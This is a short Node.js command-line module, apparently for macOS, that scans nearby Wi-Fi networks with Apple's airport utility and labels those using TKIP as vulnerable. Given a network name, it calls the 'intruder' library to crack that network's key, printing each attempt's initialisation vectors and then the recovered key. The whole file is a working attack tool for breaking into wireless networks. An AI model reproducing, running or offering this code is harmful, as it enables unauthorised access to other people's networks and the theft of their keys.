var exec = require('child_process').exec;
var Intruder = require('intruder');
var argv = require('minimist')(process.argv.slice(2));

var AIRPORT = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport';

module.exports = {
  cli: function() {
    if (argv._.length < 1) {
      this.findNetworks();
    } else {
      this.crack(argv._[0]);
    }
  },
  findNetworks: function() {
    console.log("Searching for vulnerable networks ...");
    exec(AIRPORT + ' -s', function(err, out) {
      if (err) return console.error(err);

      var networks = parseNetworks(out);
      var vulnerable = networks.filter(function (net) {
        return net.security.indexOf('TKIP') > -1;
      })
      if (vulnerable.length > 0) {
        var text = vulnerable.map(function (net) {
          return net.ssid + '('+ net.rssi +')';
        }).join(', ');
        console.log('Found '+vulnerable.length+' vulnerable from '+networks.length+' networks: '+text);
      } else {
        console.log('No vulnerable networks found, there are '+networks.length+' networks nearby.');
      }
    })
  },
  crack: function(ssid) {
    console.log('Cracking ' + ssid + ' ...');
    Intruder()
      .on('attempt', function(ivs) {
        console.log(ivs);
      })
      .crack(ssid, function(err, key) {
        if (err) return console.error(err);
        console.log(key);
      });
  }
};

function parseNetworks(out) {
  var networks = out.split('\n');
  networks = networks.slice(1, networks.length-1);
  return networks.map(function(net) {
    var t = net.split(/\s+/);
    return {ssid: t[1], bssid: t[2], rssi: t[3], channel: t[4], ht: t[5] === 'Y',
      cc: t[6] !== '--' ? t[6] : null, security: t[7]};
  }).sort(function(a, b) {
    return (a.rssi > b.rssi) ? 1 : ((b.rssi > a.rssi) ? -1 : 0);
  })
}
